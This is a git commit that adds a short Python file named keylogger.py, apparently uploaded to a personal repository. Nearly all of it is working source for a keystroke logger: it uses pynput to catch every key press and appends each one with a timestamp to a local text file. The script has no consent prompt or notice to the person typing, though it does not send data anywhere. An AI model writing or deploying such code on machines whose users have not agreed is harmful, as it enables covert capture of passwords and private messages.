5ec18dd5bd8ded4b8770e2908347d910749023cf
kartikj69 <85277352+kartikj69@users.noreply.github.com>
2023-02-01 20:06:29 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,15 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = r"C:\Users\jkart\OneDrive\Desktop\AI assistant"
+logging.basicConfig(filename=(log_dir + r"/keyLog.txt"),
+                    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+
+def on_press(key):
+    logging.info(str(key))
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
